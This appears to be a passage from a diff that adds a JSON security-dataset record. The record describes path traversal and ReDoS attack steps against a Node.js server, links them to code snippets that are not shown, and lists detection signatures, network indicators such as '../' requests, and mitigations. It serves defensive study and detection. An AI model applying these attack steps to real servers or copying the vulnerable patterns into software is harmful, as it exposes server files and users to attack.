+                    "leads_to": "Unauthorized file access or denial of service, depending on the vulnerability targeted."
+                  },
+                  {
+                    "step": 2,
+                    "action": "For path traversal: the server reads and returns sensitive files outside the intended directory due to unvalidated file paths.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Data exfiltration or information disclosure of sensitive server files."
+                  },
+                  {
+                    "step": 3,
+                    "action": "For ReDoS: the server's CPU is exhausted processing a maliciously crafted regular expression, causing the application to become unresponsive.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Denial of service for legitimate users due to server resource exhaustion."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Concatenation of user input to filesystem paths without validation",
+                    "Creation of RegExp objects from user-supplied input",
+                    "Long-running or high-CPU regex operations triggered by user input",
+                    "File access patterns that escape intended directories (e.g., use of '../' in paths)"
+                  ],
+                  "file_indicators": [
+                    "app.js, server.js, or other server files containing sendFile, fs.readFile, or similar APIs using unvalidated user input",
+                    "Code that constructs RegExp objects from HTTP request parameters without complexity checks"
+                  ],
+                  "network_indicators": [
+                    "HTTP requests with '../' or other directory traversal patterns in parameters",
+                    "Requests containing complex, nested, or repetitive regex patterns in parameters (indicative of ReDoS attempts)"
+                  ],
+                  "how_to_detect": "Statically analyze code for filesystem operations that use unvalidated user input and for RegExp construction from user-supplied data. Monitor server logs for HTTP requests containing directory traversal patterns (e.g., '../') or suspiciously complex regex patterns. Implement runtime protections such as path normalization, input validation, and regex execution timeouts to mitigate exploitation."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
